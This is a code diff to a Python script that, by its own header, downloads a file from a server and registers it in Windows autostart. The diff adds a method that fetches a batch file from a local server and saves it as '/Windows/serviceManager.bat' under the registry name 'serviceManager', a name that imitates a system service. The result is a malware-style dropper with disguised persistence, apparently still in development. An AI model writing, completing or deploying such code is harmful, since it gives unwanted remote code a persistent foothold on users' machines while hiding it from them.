@@ -1,14 +1,17 @@
 # download file from server and add it to autostart
-import winreg as reg
+# import winreg as reg
 import os
+import requests
 
 class Autostart: 
     _path_file = "" # path to download file
     _key_name = "" # reg name
+    _url = ""
 
-    def __init__(self, path_file: str, key_name: str):
+    def __init__(self, path_file: str, key_name: str, url: str):
         self._path_file = path_file
         self._key_name = key_name
+        self._url = url
 
     def install(self) -> int:
 
@@ -20,7 +23,32 @@ class Autostart:
             return 1
         return 0
 
+    def download_file(self) -> bool:
+        try:
+            file_path = self._path_file
+            
+            # os.makedirs(os.path.dirname(file_path), exist_ok=True)
+            
+            response = requests.get(self._url, stream=True)
+            response.raise_for_status()  # Проверяем статус код
+            
+            with open(file_path, 'wb') as file:
+                for chunk in response.iter_content(chunk_size=8192):
+                    if chunk:
+                        file.write(chunk)
+            return True
+            
+        except requests.exceptions.RequestException as e:
+            print(e)
+            return False
+        except IOError as e:
+            print(e)
+            return False
+        except Exception as e:
+            print(e)
+            return False
 
-# TODO: добавить файлы для запуска
-program = Autostart(r"C:\Users\koji\Desktop\littleBitch\src\scripts\test.bat", "testPython")
-program.install()
+# TODO: поэкспериментировать с путями и именами
+program = Autostart(r"/Windows/serviceManager.bat", "serviceManager", "http://127.0.0.1:7070/device/app/download/bat")
+print(program.download_file())
+#program.install()
